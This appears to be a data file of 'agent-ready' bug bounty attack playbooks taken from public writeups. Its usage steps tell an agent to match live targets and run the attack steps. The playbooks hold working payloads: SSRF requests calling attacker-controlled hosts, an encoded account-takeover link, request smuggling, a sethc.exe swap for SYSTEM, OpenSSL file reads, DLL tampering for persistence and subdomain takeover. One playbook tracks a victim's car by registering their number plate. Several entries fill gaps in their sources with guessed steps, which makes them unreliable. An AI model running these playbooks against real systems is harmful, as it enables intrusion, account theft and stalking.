description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Session hijacking through ANPR cameras

target_profile.technology: Parking and Toll Road Applications with ANPR (Automatic Number Plate Recognition)
affected_components: ANPR-based parking/toll session registration and notification system
tech_stack_fingerprints: Apps that start/stop sessions based on license plate recognition (e.g., Q-Park, Indigo, Interparking)
ANPR cameras in parking lots and on toll roads

trigger_conditions.when_to_apply: When a parking or toll road application uses Automatic Number Plate Recognition (ANPR) to start and stop sessions without verifying ownership of the license plate.
prerequisites: The target application must use ANPR for session management.
The attacker needs to know or be able to guess a valid license plate number.
applicability_signals: The parking/toll app allows registration of a license plate number.
The app does not perform multi-factor authentication or ownership verification beyond entering the license plate.
ANPR cameras are present at the parking or toll road locations managed by the app.
skip_if: The application requires the user to be physically present with the vehicle for initial registration.
The application requires a strong pre-existing authentication mechanism that is tied to the vehicle owner.
All ANPR systems are offline or not integrated with parking session management.

recon_steps: Identify parking and toll road applications that utilize ANPR technology for session management.
Investigate specific parking operators (e.g., Q-Park, Indigo, Interparking) and their app functionalities.
attack_steps: Step 1: Obtain a license plate number of a target vehicle (e.g., through public observation, previous data breaches, or social engineering).
Step 2: Register the target's license plate within the affected parking/toll application, creating a new user account or session associated with that plate.
Step 3: Wait for the target vehicle to enter a zone monitored by the ANPR system.
Step 4: Receive a push notification from the application detailing the start of a parking/toll session for the target's license plate, including the location name.
payloads_or_patterns: N/A (This is a procedural exploit, not payload-based)
tools_recommended: Burp Suite: To observe network traffic and potentially identify API endpoints used for registration and session management.
Custom scripts: To automate the registration process for multiple license plates across different applications if targeting at scale.
success_indicators: Receiving a push notification from the parking/toll app indicating a new session has started for the registered license plate.
The notification includes the name of the parking lot or toll road location where the ANPR camera detected the vehicle.
failure_indicators: Registration fails due to an existing license plate (indicating the owner is already registered). Suggest attempting other known plates or looking for applications that allow duplicate plate registrations.
No push notification is received after the target vehicle is presumed to be in an ANPR zone. Suggest verifying ANPR coverage and the app's notification settings.

playbooks.impact: An attacker can track the real-time location of a victim's vehicle by registering their license plate in vulnerable parking or toll road applications. This can lead to stalking, surveillance, and potentially other privacy violations.
playbooks.key_lesson: Always verify license plate ownership and implement multi-factor authentication or an out-of-band verification process when using ANPR for user-linked session management in consumer-facing applications.

meta.title: Skype for Business Audit Part 2 - SKYPErimeterleak

tech_stack_fingerprints: ASP.NET (indicated by .aspx files and C# code)
Skype for Business Server installation paths

trigger_conditions.when_to_apply: When the /lwa endpoint is accessible and appears to process URL-related parameters without strict validation.
prerequisites: Skype for Business Server 2019 is deployed and the Lync Web App (LWA) component is enabled and accessible externally.
applicability_signals: Existence of the /lwa URI path on the external web site configuration.
The ASPX file LwaClient.aspx is present and accessible.
The namespace Lync.Client.PreAuth is found in the code, indicating pre-authentication functionality.
skip_if: The /lwa endpoint returns an authentication challenge or is not accessible.
WAF or other security controls block requests with unusual query parameters or Base64 encoded strings.

recon_steps: Step 1: Identify the /lwa URI path in the Skype for Business Server external web site configurations (e.g., using InetMgr.exe).
Step 2: Verify accessibility of C:\Program Files\Skype for Business Server 2019\Web Components\LWA\Ext\LwaClient.aspx by navigating to it in a web browser.
Step 3: Analyze the source code or decompile the relevant assemblies (e.g., Lync.Client.PreAuth.LwaClient) to understand how query parameters like 'reachLocale', 'xml', and 'meeturl' are processed.
attack_steps: Step 1: Craft a URL for the /lwa endpoint including a Base64 encoded 'meeturl' parameter. The encoded string should contain a malicious URL.
Step 2: Send the crafted URL to the target Skype for Business server.
Step 3: Observe the server's network traffic or any potential callbacks to determine if the SSRF was successful and what resources were accessed.
payloads_or_patterns:
GET /lwa?meeturl=<BASE64_ENCODED_MALICIOUS_URL>&reachLocale=en-US HTTP/1.1
Host: <TARGET_URL>

(Where <BASE64_ENCODED_MALICIOUS_URL> is a Base64 encoded string of a URL like 'http://<attacker_controlled_server>/test')
tools_recommended: Burp Suite or OWASP ZAP: To craft and send the HTTP requests, and potentially to host an external server for receiving callbacks.
Online Base64 encoder/decoder: To easily encode the malicious URL.
success_indicators: Receiving an HTTP request at the attacker-controlled server from the target Skype for Business server's IP address.
A response from the target server indicating an attempt to access an internal resource (e.g., error messages, unexpected content).
failure_indicators: The target server responds with a 4xx or 5xx error code without any outgoing requests being observed.
The 'meeturl' validation regex ([8] or [9] in writeup) successfully blocks the crafted URL. In this case, the attacker would need to investigate bypasses for the regex.

playbooks.impact: The attacker can perform Server-Side Request Forgery (SSRF) to probe internal network resources, potentially access sensitive data or internal services, and gain insights into the target's network perimeter. This could lead to further exploitation or denial of service.
playbooks.key_lesson: Always validate and sanitize user-supplied URLs, especially when they are processed by server-side HTTP requests. Pay close attention to Base64 encoded parameters, as they can obscure malicious input.

meta.title: New Attack Paths? AS Requested Service Tickets

affected_components: Service Ticket (ST) requests for machine accounts

trigger_conditions.when_to_apply: This attack is applicable when the target environment utilizes Active Directory with Kerberos authentication, and the attacker has the ability to make authentication requests, particularly for machine accounts.
prerequisites: An Active Directory environment is in place.
Kerberos is the primary authentication protocol.
Attacker has network access to the KDC (Key Distribution Center).
applicability_signals: Observing AS-REQ (Authentication Service Request) packets directed towards the KDC.
Focus on AS-REQs for machine accounts, as these are described as 'unarmored'.
skip_if: The target environment does not use Active Directory or Kerberos.
All authentication requests are heavily filtered or blocked by network controls.

recon_steps: Step 1: Monitor network traffic for Kerberos authentication requests (AS-REQs) to identify communication with the KDC.
Step 2: Analyze AS-REQs specifically for machine accounts to confirm the 'unarmored' characteristic mentioned in the writeup.
attack_steps: Step 1: Craft an AS-REQ for a service ticket (ST) targeting a machine account, bypassing the normal TGS (Ticket Granting Service) request flow.
Step 2: Attempt to obtain a service ticket directly from the Authentication Service (AS).
Step 3: Analyze the obtained service ticket for any exploitable information or characteristics that can be leveraged for further attacks.
payloads_or_patterns: Insufficient detail in writeup. The writeup describes the *concept* of requesting STs from AS for machine accounts but does not provide concrete packet crafting or tool usage examples.
tools_recommended: Insufficient detail in writeup. Tools like Kerberos-specific packet crafting tools or libraries might be relevant.
success_indicators: Successful acquisition of a service ticket (ST) for a machine account directly from the AS.
The ST can be used for subsequent actions, such as authentication to services or further reconnaissance.
failure_indicators: AS returns an error or refuses the request for an ST directly from AS.
Detected by security monitoring systems for anomalous Kerberos requests.
WAF or network controls block the crafted AS-REQ.

playbooks.impact: This technique can lead to new attack paths by bypassing normal Kerberos ticket issuance flows, potentially enabling detection bypasses and weakening security controls. Specific impacts depend on the services the machine account can access and how the obtained ST can be leveraged.
playbooks.key_lesson: Investigate if Kerberos machine account authentication requests are 'unarmored' and explore the possibility of directly requesting service tickets from the Authentication Service (AS) to discover new attack vectors.

meta.title: Blind account takeover

trigger_conditions.when_to_apply: This technique is applicable when the account registration flow allows multiple email addresses to be processed by the server, and the activation link generation mechanism does not properly validate or sanitize the input.
prerequisites: The target application has an account registration flow that requires an email address.
The application generates an activation link sent to the provided email address.
The application does not properly validate or sanitize multiple email addresses provided in a single input field.
applicability_signals: The registration URL contains a parameter that appears to encode user information (e.g., `user=YWNjb3VudEBtYWlsLmNvbQ==`).
The application uses Base64 encoding for parameters in the URL.
The registration form accepts a single email address as input.
skip_if: The registration flow strictly validates a single, unique email address per registration attempt.
Server-side validation prevents multiple email addresses from being processed.
The activation link generation mechanism explicitly checks for and rejects multiple recipients.

recon_steps: Step 1: Navigate to the account registration page and observe the structure of the URL when submitting an email address.
Step 2: Submit a known email address and analyze the generated activation link to identify any encoding or parameters used.
attack_steps: Step 1: Construct a Base64 encoded string containing two email addresses separated by a semicolon and potentially padded with spaces to obscure the semicolon. Example: `victim@mail.com; attacker@mail.com` encoded.
Step 2: Craft a registration URL using the constructed Base64 encoded string in the `user` parameter. Example: `https://<TARGET_URL>/signup/?user=<BASE64_ENCODED_EMAILS>`.
Step 3: Deliver this crafted URL to a potential victim.
Step 4: Instruct the victim to open the URL and complete the registration process.
Step 5: Monitor your own email inbox for the activation link sent by the target application.
Step 6: Once the victim has registered and potentially entered personal data, open your activation link to take over the account.
payloads_or_patterns: Construct Base64 string of `victim@mail.com; attacker@mail.com` (with appropriate spacing if needed for obfuscation): `dmljdGltQG1haWwuY29tOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhdHRhY2tlckBtYWlsLmNvbQ==`
Crafted URL: `https://<TARGET_URL>/signup/?user=dmljdGltQG1haWwuY29tOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhdHRhY2tlckBtYWlsLmNvbQ==`
tools_recommended: Base64 encoder/decoder (e.g., CyberChef, online tools)
Email client for both attacker and victim accounts
success_indicators: Receiving an activation email at the attacker's email address after the victim initiates registration.
Successfully accessing and modifying account details of the victim after clicking the activation link.
Being able to use the victim's account as if it were the attacker's account.
failure_indicators: The target application displays an error message indicating invalid email format or rejects the submission when the crafted URL is used.
Only one activation email is sent, and it goes to the victim's inbox.
The activation link does not grant access to the account, or the attacker's email is not associated with the registered account.

playbooks.impact: An attacker can gain unauthorized access to a victim's newly created account, potentially leading to data exposure, service abuse, or further exploitation.
playbooks.key_lesson: Always test for the ability to provide multiple values in parameters that are expected to accept a single value, especially during registration or input processing, and ensure proper server-side validation and sanitization.

meta.title: Blind XSS on Admin Portal Leads to Information Disclosure

trigger_conditions.when_to_apply: When an authenticated user can ask a question and then re-open it with a reason, and the reason field lacks proper input validation, allowing for script execution when an administrator reviews the reopened question.
prerequisites: Attacker must have an authenticated user account on the target web application.
The target application must have an 'Ask Q&A' feature that allows users to ask questions and administrators to answer them.
There must be a 'Re-open' functionality for questions, with a field to provide a reason.
The 'Re-open reason' field must be vulnerable to XSS.
applicability_signals: Presence of an 'Ask Q&A' feature.
Availability of a 'Re-open' button for questions.
A text input field for the reason when re-opening a question.
skip_if: Input validation on the 'Re-open reason' field sanitizes or blocks script tags.
Admin actions (like answering or reviewing questions) are not logged or do not trigger callbacks to external services.

recon_steps: Step 1: Identify and interact with the 'Ask Q&A' functionality on the target web application.
Step 2: Attempt to submit questions, observing any input validation or sanitization.
Step 3: After submitting a question, check for a 'Re-open' option. If present, inspect the 'reason' field for vulnerabilities.
attack_steps: Step 1: Submit a question through the 'Ask Q&A' feature.
Step 2: Once the question is answered by an administrator, click the 'Re-open' button.
Step 3: In the 'reason' field, inject a Blind XSS payload that includes a callback to a service like XSSHUNTER.
Step 4: Monitor the XSSHUNTER account for incoming callbacks, which indicate successful payload execution.
Step 5: Analyze the data received from XSSHUNTER, which may include session cookies, IP addresses, and administrator dashboard screenshots.
Step 6: If sensitive information like an administrator's email is found in the screenshots, attempt to leverage this for further attacks (e.g., password reset).
payloads_or_patterns: "-->
tools_recommended: XSSHUNTER: To receive callbacks and capture data from Blind XSS payloads.
success_indicators: Receipt of a callback notification from XSSHUNTER, indicating the payload has been executed.
XSSHUNTER report containing session information, cookies, URLs, IP addresses, and/or administrator dashboard screenshots.
failure_indicators: No callback received from XSSHUNTER after a reasonable period (e.g., 2-3 days). This might indicate that the input is sanitized, the payload is blocked by a WAF, or the administrator never viewed the reopened question. Pivot to other vulnerabilities or try different XSS payloads.

Callback received but no sensitive information is disclosed in the XSSHUNTER report. This could mean the payload fired but didn't capture useful data, or the admin context was not rich in information. Try payloads that attempt to steal specific data or perform actions.

playbooks.impact: Disclosure of sensitive administrative information including session cookies, IP addresses, and screenshots of the administrator dashboard, potentially leading to account takeover or further unauthorized access.
playbooks.key_lesson: Always test input fields that are processed by administrators or moderators for Blind XSS vulnerabilities, especially when they appear after an initial interaction has been completed (e.g., re-opening a ticket or feedback).

meta.title: Microsoft Windows Shift F10 Bypass and Autopilot privilege escalation

trigger_conditions.when_to_apply: When an attacker can intercept or influence the initial setup process of a Windows machine, particularly in environments utilizing Microsoft Autopilot or any scenario where initial OS installation prompts are accessible.
prerequisites: Physical or remote access to the machine during the Windows Out-of-Box Experience (OOBE) or installation phase.
The Shift + F10 key combination is not disabled by system policy during installation.
applicability_signals: The appearance of the Windows setup/installation wizard.
The ability to trigger the Sticky Keys utility or Magnifier utility.
The Shift + F10 key combination successfully opens a command prompt during installation.
skip_if: The Shift + F10 key combination is confirmed to be disabled or unresponsive during installation.
The system automatically proceeds through installation without user interaction or prompts where Shift+F10 can be used.

recon_steps: Step 1: Initiate a Windows installation on a target system (or observe an ongoing installation).
Step 2: At the initial setup screen (e.g., language selection, network configuration), press Shift + F10 to attempt to open a command prompt.
attack_steps: Step 1: During the Windows installation phase, press Shift + F10 to open the command prompt.
Step 2: Navigate to the Sticky Keys executable path (e.g., `C:\Windows\System32\sethc.exe`).
Step 3: Rename `sethc.exe` to a temporary name (e.g., `sethc.exe.bak`).
Step 4: Copy `cmd.exe` to `C:\Windows\System32\sethc.exe`.
Step 5: Exit the command prompt and proceed with the Windows installation.
Step 6: Once the installation is complete and the system restarts to the login screen, press the Shift key five times rapidly to trigger the Sticky Keys utility.
Step 7: The Sticky Keys utility will launch a command prompt with SYSTEM privileges.

Step 8: Use this elevated command prompt to perform post-exploitation actions, such as installing backdoors, creating new user accounts, or accessing sensitive data. (Further privilege escalation steps for Autopilot are implied but not detailed in the writeup).
payloads_or_patterns: cmd.exe
sethc.exe
sethc.exe.bak
tools_recommended: Windows Installation Media
Command Prompt (cmd.exe)
success_indicators: The Sticky Keys dialog appearing when Shift is pressed five times at the login screen.
A command prompt window opening with SYSTEM privileges when Sticky Keys is triggered.
The ability to execute commands with SYSTEM privileges at the login screen.
failure_indicators: Shift + F10 not opening a command prompt during installation (suggests policy or configuration change).
Sticky Keys utility not launching when Shift is pressed five times (suggests `sethc.exe` was not replaced or removed).
Command prompt launching without SYSTEM privileges (indicates incorrect replacement or a different vulnerability).

playbooks.impact: Allows an attacker to gain SYSTEM-level privileges on a Windows machine during or immediately after its initial setup, bypassing intended security restrictions and potentially compromising the entire system and corporate network if used in an Autopilot scenario.
playbooks.key_lesson: Always verify that the Shift+F10 (or similar) shortcut to open a command prompt during Windows installation is disabled via GPO or other hardening mechanisms, as it can be exploited to gain SYSTEM privileges.

meta.title: CVE-2022-35256 - HTTP Request Smuggling in NodeJS

trigger_conditions.when_to_apply: This vulnerability is applicable when a vulnerable Node.js application is exposed behind a reverse proxy that incorrectly processes HTTP/1.1 requests with inconsistent `Content-Length` and `Transfer-Encoding` headers.
prerequisites: The target must be a Node.js application.
The Node.js application must be exposed behind a reverse proxy (e.g., Nginx, HAProxy).
The reverse proxy must process HTTP/1.1 requests and have a potential misconfiguration in handling conflicting `Content-Length` and `Transfer-Encoding` headers.
applicability_signals: Observing the target application accept requests with both `Content-Length` and `Transfer-Encoding` headers simultaneously.
The target application responds to such requests.
skip_if: The target application explicitly rejects requests with conflicting `Content-Length` and `Transfer-Encoding` headers.
The reverse proxy correctly normalizes or rejects requests with ambiguous header values.

recon_steps: Step 1: Identify the target Node.js application and its reverse proxy configuration.

Step 2: Send various HTTP requests to the target with conflicting `Content-Length` and `Transfer-Encoding` headers to observe the response behavior and check for potential discrepancies in how the request is processed by the proxy versus the backend application.
attack_steps: Step 1: Craft an HTTP request with a leading `POST` or `GET` request, followed by a `Content-Length` header and a `Transfer-Encoding` header. The value of `Transfer-Encoding` should be 'chunked'.

Step 2: Include a body for the request that mimics a chunked transfer encoding, but intentionally use a malformed chunk size or a final chunk marker that is processed differently by the proxy and the backend.

Step 3: Specifically, send a request where the `Content-Length` indicates a certain body size, and the `Transfer-Encoding: chunked` header is also present. The backend application may interpret the request differently based on which header it prioritizes.

Step 4: The smuggled request will then be appended to the malformed chunked body and will be processed by the backend application as a separate, subsequent request. This can be used to prefix arbitrary data to subsequent requests or to trick the backend into processing a request intended for a different user or context.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: <TARGET_URL>
Foo: bar
tools_recommended: Burp Suite or OWASP ZAP for crafting and sending HTTP requests with precise header manipulation.
Custom scripts (Python, Go) for automated testing of various header combinations and body structures.
success_indicators: Receiving a response that indicates the smuggled request was processed, such as accessing an admin page that should not be accessible, or observing unusual behavior in subsequent requests.
If the smuggled request is a `GET` request to an internal resource and the response for that resource is received in place of the expected response for the original request.
failure_indicators: Receiving a '400 Bad Request' or similar error indicating the request was rejected due to malformed headers.

The application consistently processes the request based on only one of the headers, and no smuggled request is executed. In this case, investigate different header ordering and values, or different proxy configurations.

playbooks.impact: An attacker can prepend arbitrary HTTP requests to a legitimate user's request, leading to unauthorized access to sensitive information or execution of unintended actions. This can include session hijacking, privilege escalation, or execution of administrative functions.
playbooks.key_lesson: Always normalize or reject HTTP requests containing conflicting `Content-Length` and `Transfer-Encoding` headers to prevent request smuggling vulnerabilities.

meta.title: Pre-Auth Remote Code Execution - Web Page Test
meta.programs: ManoMano (CatchPoint is mentioned but seems to be a typo or an internal system)

trigger_conditions.when_to_apply: When Web Page Test is deployed and accessible, especially in an environment with potentially outdated components or unpatched vulnerabilities.
prerequisites: Web Page Test (WPT) software is installed and running.
applicability_signals: WPT is used for performance audits.
WPT relies on PHP.
WPT has known SSRF vulnerabilities.
skip_if: WPT is not in use.
WPT has been fully patched and removed.

recon_steps: Step 1: Identify if Web Page Test (WPT) is deployed within the target infrastructure. Look for public-facing instances or mentions in documentation.
Step 2: Analyze the version of WPT and its dependencies (PHP, libraries, containers). Check for known vulnerabilities, especially SSRF.
attack_steps: Step 1: Identify an existing SSRF vulnerability in Web Page Test. (Details not provided in writeup)

Step 2: Craft a malicious payload that leverages the SSRF vulnerability to achieve Remote Code Execution. This likely involves interacting with internal services or exploiting deserialization vulnerabilities within the WPT environment. (Specifics of payload construction are missing)
Step 3: Execute the crafted payload against the vulnerable WPT instance (master or worker) to achieve RCE. (Specific steps for execution are missing)
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Web Page Test (WPT) itself (as the target)
Tools to identify and exploit SSRF vulnerabilities (e.g., Burp Suite, custom scripts)
Tools for crafting RCE payloads specific to the target environment (e.g., PHP RCE payloads, shell commands)
success_indicators: Successful execution of arbitrary commands on the WPT master or worker server.
Obtaining a reverse shell or command output from the target server.
failure_indicators: SSRF vulnerability is not present or patched.
Payloads do not result in command execution.
Network segmentation or security controls prevent exploitation.

playbooks.impact: Pre-authentication Remote Code Execution on Web Page Test master or worker servers, allowing an attacker to compromise the underlying infrastructure.
playbooks.key_lesson: Thoroughly assess the security posture of third-party software like Web Page Test, especially when integrated into critical infrastructure, as outdated components and existing vulnerabilities can be chained into severe impacts like RCE.

meta.title: Exploiting Distroless Images

target_profile.technology: Google Container Tools Distroless Base Image

trigger_conditions.when_to_apply: When the target environment utilizes Google's distroless/base container image and the application within the container makes direct use of the OpenSSL binary for any operations.
prerequisites: The container must be running an application that includes or has access to the OpenSSL binary from the distroless/base image.
applicability_signals: Existence of `/usr/bin/openssl` within the container.
Application code or configuration explicitly calling `openssl` commands.
skip_if: The container does not contain the `openssl` binary.
The `openssl` binary is not accessible or executable by the application.
The application does not interact with `openssl` in a way that allows payload injection (e.g., only for certificate validation without user input).

recon_steps: Step 1: Identify if the target application is deployed using `gcr.io/distroless/base` or a similar distroless image.
Step 2: If a distroless image is confirmed, attempt to shell into the container to verify the presence of `/usr/bin/openssl`.
attack_steps: Step 1: Craft an `openssl` command to write a file. Example: `openssl enc -in /etc/passwd -out /tmp/passwd.enc -e -aes-256-cbc -pass pass:password` (This command reads `/etc/passwd` and encrypts it to `/tmp/passwd.enc` using a fixed password).

Step 2: If file write is possible, craft a command to write a malicious shared library (e.g., a `pwn.so` for command execution) to a writable location within the container. Example: `openssl enc -in /path/to/malicious.so -out /tmp/malicious.so.enc -e -aes-256-cbc -pass pass:password`.

Step 3: Execute the `openssl` command to write the encrypted shared library. Then, use `openssl`'s `engine` functionality to load the decrypted shared library. This step requires prior knowledge of how to achieve command execution via shared library injection with OpenSSL, which typically involves specific command-line arguments and potentially a custom-compiled shared library. The writeup implies combining `enc` with `engine` for loading shared libraries. A concrete example would involve a multi-step process: first writing the library, then dynamically loading it using `openssl engine` with specific parameters to trigger code execution.
Step 4: Verify command execution by observing side effects such as network callbacks or changes in the application's behavior.
payloads_or_patterns: Payload for file read (example): `openssl enc -in <FILE_PATH> -out /tmp/output.enc -e -aes-256-cbc -pass pass:insecurepassword`
Payload for file write (example): `openssl enc -in <LOCAL_FILE_PATH> -out <REMOTE_FILE_PATH> -e -aes-256-cbc -pass pass:insecurepassword`
Payload for command execution (conceptual, requires crafted shared library and specific `openssl engine` invocation): `openssl engine <path_to_decrypted_malicious_library>`
tools_recommended: Docker: For building and running test containers.
OpenSSL CLI: For crafting and executing commands.
Custom C/C++ compiler: For creating the malicious shared library.
success_indicators: Successful encryption/decryption of files with `openssl`.
Creation of files (e.g., shared libraries) in unexpected locations within the container.
Receiving a network callback from the compromised container, indicating command execution.
Unexpected application behavior or error messages suggesting code injection.
failure_indicators: 403 Forbidden or permission errors when attempting to write files to `/tmp` or other directories.
OpenSSL command failing with syntax errors or unrecognised options.
No response or network callback after attempting command execution.
Container crashing or becoming unresponsive after attempting to load the shared library.

playbooks.impact: Attacker can achieve command execution within the container, leading to arbitrary file read, arbitrary file write, and potentially container escape or compromise of sensitive data processed by the application. This allows for deeper system compromise and data exfiltration.
playbooks.key_lesson: Even minimal distroless images can have exploitable binaries like OpenSSL; always verify the attack surface of included tools and their available functionalities, especially when they interact with file I/O or dynamic loading.

meta.title: Skype for Business Audit Part 1 - SKYPErsistence

tech_stack_fingerprints: C:\Program Files\Skype for Business Server 2019\Web Components\PassiveAuth\Ext directory structure

trigger_conditions.when_to_apply: When an attacker has authenticated access to the Skype for Business server and can modify server-side DLLs, specifically targeting the PassiveAuth endpoint.
prerequisites: Attacker has administrative access or ability to deploy modified DLLs to the Skype for Business server's Global Assembly Cache (GAC).
Skype for Business is configured with ADFS and potentially Multi-Factor Authentication (Passive Auth Mode = WifSession).
applicability_signals: Existence of the /PassiveAuth endpoint.
The presence of `OCSAuthHelperModule`, `OCSAuthModule`, `WSFederationAuthenticationModule`, and `SessionAuthenticationModule` in the web.config file under `<system.webServer><modules>`.
The `SessionAuthenticationModule` is implemented by `Microsoft.Rtc.Internal.WebServicesAuthFramework.OCSSessionAuthenticationModule`.
skip_if: The server is not running Skype for Business.
The /PassiveAuth endpoint is not accessible or does not exist.
The attacker cannot modify or replace system DLLs on the server.

recon_steps: Step 1: Identify the Skype for Business server and accessible endpoints. Browse to the /PassiveAuth endpoint (e.g., `https://skype01.contoso.com/PassiveAuth/`).
Step 2: Use IIS Manager (InetMgr.exe) to identify application pools and their corresponding file paths. Focus on external-facing components.
Step 3: Examine the file system at `C:\Program Files\Skype for Business Server 2019\Web Components\PassiveAuth\Ext` for `.aspx` files, `bin/` directories, and `Web.config`.

Step 4: Attach a .NET debugger (e.g., dnSpy) to the relevant IIS worker process (w3wp.exe) and load all modules to inspect their functionalities. Pay close attention to HTTP modules listed in `Web.config`.
attack_steps: Step 1: Locate the `Microsoft.Rtc.Server.WebInfrastructure.dll` assembly, specifically the `OCSSessionAuthenticationModule` class.
Step 2: Analyze the `InitializeModule` method within `OCSSessionAuthenticationModule`. Identify the condition `OCSAuthModule.PassiveAuthMode == PassiveAuthMode.WifSession`.

Step 3: Modify the `Microsoft.Rtc.Server.WebInfrastructure.dll` assembly using a .NET decompiler/editor (e.g., dnSpy) to bypass or alter the condition that prevents the `InitializePropertiesFromConfiguration()` method from being called.
Step 4: Stop Skype for Business services using the `Stop-CsWindowsService` PowerShell cmdlet.
Step 5: Stop IIS using `iisreset.exe /stop`.
Step 6: Replace the original `Microsoft.Rtc.Server.WebInfrastructure.dll` in the Global Assembly Cache (GAC) with the modified version.
Step 7: Start IIS using `iisreset.exe /start`.
Step 8: Start Skype for Business services using `Start-CsWindowsService`.
payloads_or_patterns: Modified `Microsoft.Rtc.Server.WebInfrastructure.dll` (specific modification depends on bypassing the `OCSAuthModule.PassiveAuthMode == PassiveAuthMode.WifSession` check).
tools_recommended: dnSpy or similar .NET decompiler/editor
PowerShell for `Stop-CsWindowsService` and `Start-CsWindowsService`
cmd for `iisreset.exe`
success_indicators: The modified DLL is loaded into the GAC and the Skype for Business services start without errors.

Subsequent requests to the PassiveAuth endpoint are processed differently due to the bypassed or altered authentication logic, potentially leading to persistence or unauthorized access. The writeup implies that this modification enables a persistence mechanism, but the exact post-modification behavior is not fully detailed for general exploitation.
failure_indicators: Skype for Business services fail to start after DLL replacement.
No observable change in authentication behavior at the /PassiveAuth endpoint, indicating the modification was ineffective or the prerequisite conditions were not met.
403 Forbidden or other access denied errors on the /PassiveAuth endpoint after modification, suggesting the bypass was incomplete or an alternative security control is in place.

playbooks.impact: Achieve persistence on a Skype for Business server by manipulating the authentication module. This could allow an attacker to maintain access to the server, potentially leading to further lateral movement, data exfiltration, or other malicious activities.
playbooks.key_lesson: When auditing .NET applications, especially those with custom authentication modules, investigate the conditions under which these modules execute and consider modifying assemblies in the GAC for persistence or bypassing authentication logic.

meta.title: One takeover to rule them all

tech_stack_fingerprints: CNAME record pointing to an external, potentially expired domain

trigger_conditions.when_to_apply: This technique is applicable when a subdomain's CNAME record points to a domain that is available for purchase.
prerequisites: Attacker has the ability to purchase and control a domain name.
applicability_signals: A CNAME record for a subdomain (e.g., `nucleaire.edf.fr`) points to an external domain (e.g., `edf-linkbynet.com`).
The external domain referenced in the CNAME record is found to be available for purchase.
skip_if: All subdomains use A records or CNAME records pointing to actively managed domains.

recon_steps: Step 1: Use a subdomain enumeration tool (e.g., subfinder, oneforall, amass) to discover subdomains of the target (e.g., edf.fr).
Step 2: Use a DNS resolution tool (e.g., massdns) to query all discovered subdomains and identify CNAME records.
Step 3: For each identified CNAME record, check the target domain using a domain registrar or WHOIS lookup to see if it's available for purchase.
attack_steps: Step 1: Purchase the available expired domain identified in recon (e.g., `edf-linkbynet.com`).
Step 2: Configure the purchased domain on a server controlled by the attacker.
Step 3: Set up a web server on the attacker's server to host a Proof-of-Concept page or malicious content.
Step 4: Monitor server logs to observe traffic directed to the taken-over subdomain.
payloads_or_patterns: A DNS CNAME record pointing to an expired domain that is now controlled by the attacker.
tools_recommended: subfinder: for subdomain discovery
oneforall: for subdomain discovery
amass: for subdomain discovery
massdns: for DNS resolution and CNAME detection
Gandi or similar domain registrar: for purchasing expired domains
Nginx or Apache: for hosting a PoC page on the attacker's server
success_indicators: Requests to the subdomain (e.g., `nucleaire.edf.fr`) are received on the attacker's server.
The PoC page or attacker-controlled content is served when accessing the subdomain.
failure_indicators: The CNAME target domain is not available for purchase or is actively managed by the original owner. Pivot to other reconnaissance methods or subdomain takeover vectors.
No traffic is observed on the attacker's server after setting up the domain. Verify DNS propagation and CNAME configuration.

playbooks.impact: The attacker can host malicious content on subdomains, leading to phishing, social engineering, cookie manipulation, or reputational damage to the organization. In this case, over 450 subdomains were affected.
playbooks.key_lesson: When a subdomain's CNAME record points to an external domain, always check if that external domain is expired and available for purchase, as it can lead to subdomain takeover.

meta.title: Exploiting Web3’s Hidden Attack Surface: Universal XSS on Netlify’s Next.js Library
meta.programs: Netlify, Gemini, PancakeSwap, Docusign, Moonpay, Celo

trigger_conditions.when_to_apply: When a Next.js application is deployed on Netlify and utilizes the `netlify-ipx` library or similar image optimization services that are vulnerable to improper host parsing or header manipulation.
prerequisites: Target website uses Next.js framework.
Target website is deployed on Netlify or a similar platform with image optimization enabled.
The `netlify-ipx` library or a similar component relying on the `unjs/ufo` library is in use.
applicability_signals: Presence of `/_next/image` endpoint.
Responses contain headers related to image optimization or caching.
Observed use of external image services or CDNs.
skip_if: WAF blocks requests to image optimization endpoints.
The `netlify-ipx` library is updated to a patched version.
Server explicitly validates `Host` and `X-Forwarded-Proto` headers against expected values.

recon_steps: Step 1: Identify Next.js applications deployed on Netlify by searching for common Next.js fingerprints (e.g., `/_next/static/chunks/`) and Netlify-specific headers or DNS records.

Step 2: Analyze network traffic for requests to image optimization endpoints like `/_next/image` and inspect the parameters and response headers for clues about the underlying libraries used (e.g., `Server: Netlify`).
attack_steps: Step 1: Craft a request to the `/_next/image` endpoint with a malicious `href` parameter pointing to an attacker-controlled server or a server that can be abused for SSRF.

Step 2: For XSS, craft a payload within the `href` parameter that leverages the improper host parsing or relies on the `unjs/ufo` library's vulnerabilities to execute JavaScript in the user's browser.
Step 3: For SSRF, craft a payload in the `href` parameter that targets internal network resources or external services, exploiting the improper host parsing.
Step 4: Investigate the impact of the `x-forwarded-proto` header manipulation, especially in conjunction with caching mechanisms, to achieve persistent XSS or further SSRF.
payloads_or_patterns: http://<TARGET_URL>/_next/image?url=//attacker.com/img.jpg&w=828&q=75 (for initial testing of host parsing)
http://<TARGET_URL>/_next/image?url=javascript:alert(document.domain)//.jpg&w=828&q=75 (for XSS)
http://<TARGET_URL>/_next/image?url=http://internal-server.local/admin&w=828&q=75 (for SSRF)
POST to `<TARGET_URL>/_next/image` with manipulated `x-forwarded-proto: https` and a crafted `url` parameter that injects payload via cache poisoning.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, craft payloads, and analyze responses.
Custom scripts: For automated testing of multiple targets and payloads.
success_indicators: JavaScript `alert()` box appears in the browser after visiting a crafted URL.
Server-side request to an attacker-controlled endpoint (e.g., Burp Collaborator) is observed.
